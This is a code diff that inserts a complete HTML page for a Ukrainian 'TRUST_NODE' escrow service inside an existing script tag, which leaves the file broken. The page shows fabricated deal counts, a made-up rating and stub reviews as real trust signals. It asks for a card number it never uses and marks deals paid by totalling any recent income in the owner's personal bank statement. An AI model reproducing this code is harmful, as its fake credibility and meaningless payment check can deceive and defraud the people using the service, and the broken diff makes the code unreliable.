@@ -67,7 +67,205 @@
 
     <script src="config.js"></script>
     <script>
-        // Тут буде основний скрипт (нижче в поясненні)
+        <!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRUST_NODE | Professional Escrow</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+</head>
+<body>
+
+    <div class="menu-icon" onclick="toggleMenu()">☰</div>
+
+    <div class="sidebar" id="sidebar">
+        <div id="g_id_onload" 
+             data-client_id="ВСТАВ_СВІЙ_ID_ТУТ.apps.googleusercontent.com" 
+             data-callback="onSignIn">
+        </div>
+        <div class="g_id_signin" data-type="standard"></div>
+        
+        <div id="user-info" style="display:none; margin-top:30px;">
+            <p style="color:var(--main)">Verified ✅</p>
+            <p>ID: <span id="my-id">...</span></p>
+            <a href="https://t.me/pingvin4ikpororo" target="_blank" class="menu-link">✈️ Support @pingvin4ikpororo</a>
+        </div>
+
+        <div id="admin-panel" style="display:none; border-top:1px solid gold; margin-top:20px; padding-top:10px;">
+            <h4 style="color:gold">ADMIN CENTER</h4>
+            <div id="admin-logs" style="font-size: 11px;"></div>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div id="screen-main">
+            <h1 class="logo">TRUST_NODE</h1>
+            <div class="stats-grid">
+                <div class="stat-item"><h2>10k+</h2><p>Угод</p></div>
+                <div class="stat-item"><h2>4.9</h2><p>Рейтинг</p></div>
+            </div>
+            <button class="btn-main" id="start-btn" onclick="showStep('connect')" disabled>ВИКОНАТИ УГОДУ</button>
+            <p id="login-warn" style="font-size:12px; color:#555; margin-top:10px;">Авторизуйтесь через Google</p>
+        </div>
+
+        <div class="glass" id="screen-connect" style="display:none">
+            <h3>Створення угоди</h3>
+            <input type="text" id="target-buyer" placeholder="ID Покупця (напр. TN-123)">
+            <input type="number" id="deal-amount" placeholder="Сума (₴)">
+            <button class="btn-main" onclick="initBridge()">СТВОРИТИ МІСТ</button>
+        </div>
+
+        <div class="glass" id="screen-confirm" style="display:none">
+            <h3 id="confirm-msg">Запит на покупку</h3>
+            <button class="btn-main" onclick="handleBridge(true)">ТАК, КУПУЮ</button>
+            <button class="btn-main" style="background:#333; margin-top:10px;" onclick="handleBridge(false)">ВІДМОВА</button>
+        </div>
+
+        <div class="glass" id="screen-pay" style="display:none">
+            <h2 id="display-price">0.00 ₴</h2>
+            <div id="pay-status" class="status-box">Очікування оплати...</div>
+            <input type="text" placeholder="Карта для авторизації">
+            <button class="btn-main" onclick="syncMono()">ПЕРЕВІРИТИ БАЛАНС</button>
+        </div>
+
+        <div class="glass" id="screen-finish" style="display:none">
+            <h3 style="color:var(--main)">ГРОШІ ЗАМОРОЖЕНО 🛡️</h3>
+            <p id="finish-instruction" style="font-size:14px;"></p>
+            <div id="buyer-confirm" style="display:none">
+                <button class="btn-main" onclick="completeDeal()">ПІДТВЕРДИТИ ОТРИМАННЯ</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="reviews-block" style="padding: 50px 20px;">
+        <h3>Відгуки користувачів (314)</h3>
+        <div id="rev-list"></div>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        let currentDealId = null;
+
+        function toggleMenu() { document.getElementById('sidebar').classList.toggle('active'); }
+
+        function onSignIn(resp) {
+            const payload = JSON.parse(atob(resp.credential.split('.')[1]));
+            user.email = payload.email;
+            document.getElementById('user-info').style.display = 'block';
+            document.getElementById('login-warn').style.display = 'none';
+            document.getElementById('start-btn').disabled = false;
+            document.getElementById('my-id').innerText = user.id;
+            if(user.email === CONFIG.adminEmail) document.getElementById('admin-panel').style.display = 'block';
+            listenForDeals();
+        }
+
+        function showStep(step) {
+            document.querySelectorAll('.glass, #screen-main').forEach(el => el.style.display = 'none');
+            document.getElementById('screen-' + step).style.display = 'block';
+        }
+
+        // Логіка створення мосту
+        async function initBridge() {
+            const buyer = document.getElementById('target-buyer').value;
+            const price = parseFloat(document.getElementById('deal-amount').value);
+            if(!buyer || !price) return alert("Заповніть дані!");
+            
+            currentDealId = user.id + "_" + buyer;
+            await db.collection("deals").doc(currentDealId).set({
+                seller: user.id,
+                buyer: buyer,
+                amount: price,
+                paid: 0,
+                status: "waiting",
+                timestamp: Date.now()
+            });
+            alert("Запит надіслано покупцю. Очікуйте.");
+        }
+
+        // Слухач для покупця
+        function listenForDeals() {
+            db.collection("deals").where("buyer", "==", user.id).onSnapshot(snap => {
+                snap.docChanges().forEach(change => {
+                    const data = change.doc.data();
+                    currentDealId = change.doc.id;
+                    if(data.status === "waiting") {
+                        document.getElementById('confirm-msg').innerText = `Ви купуєте у ${data.seller} за ${data.amount} ₴?`;
+                        showStep('confirm');
+                    }
+                    updateUI(data);
+                });
+            });
+        }
+
+        async function handleBridge(agree) {
+            if(agree) {
+                await db.collection("deals").doc(currentDealId).update({ status: "active" });
+                showStep('pay');
+            } else {
+                await db.collection("deals").doc(currentDealId).delete();
+                location.reload();
+            }
+        }
+
+        // Перевірка Monobank
+        async function syncMono() {
+            const doc = await db.collection("deals").doc(currentDealId).get();
+            const deal = doc.data();
+            
+            document.getElementById('pay-status').innerText = "Синхронізація з банком...";
+            
+            const res = await fetch(`https://api.monobank.ua/personal/statement/0/${Math.floor(Date.now()/1000)-600}`, {
+                headers: {'X-Token': CONFIG.monoToken}
+            });
+            const data = await res.json();
+            
+            // Рахуємо суму всіх підходящих транзакцій
+            let totalPaid = data
+                .filter(t => t.amount > 0)
+                .reduce((s, t) => s + (t.amount / 100), 0);
+
+            const need = deal.amount - totalPaid;
+
+            if(need <= 0) {
+                await db.collection("deals").doc(currentDealId).update({ status: "paid", paid: totalPaid });
+            } else {
+                document.getElementById('pay-status').innerText = `Отримано ${totalPaid} ₴. До сплати ще ${need.toFixed(2)} ₴`;
+            }
+        }
+
+        function updateUI(data) {
+            if(data.status === "paid") {
+                showStep('finish');
+                if(user.id === data.seller) {
+                    document.getElementById('finish-instruction').innerText = "Гроші в Гаранта. Передайте дані покупцю.";
+                } else {
+                    document.getElementById('finish-instruction').innerText = "Оплата успішна. Очікуйте дані від продавця.";
+                    document.getElementById('buyer-confirm').style.display = 'block';
+                }
+                if(user.email === CONFIG.adminEmail) showAdminInfo(data);
+            }
+        }
+
+        function showAdminInfo(data) {
+            const profit = data.amount * CONFIG.fee;
+            document.getElementById('admin-logs').innerHTML = `
+                <div style="background:#1a1a1a; padding:5px; margin-bottom:5px;">
+                    Угода: ${data.amount} ₴<br>
+                    Твій профіт: ${profit.toFixed(2)} ₴<br>
+                    Виплата продавцю: ${(data.amount - profit).toFixed(2)} ₴
+                </div>`;
+        }
+
+        // Відгуки (заглушка)
+        const revs = ["Крутий сервіс!", "Все швидко", "Гарант супер", "Рекомендую"];
+        document.getElementById('rev-list').innerHTML = revs.map(r => `<div class="review-card"><b>User_${Math.floor(Math.random()*100)}</b>: ${r}</div>`).join('');
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
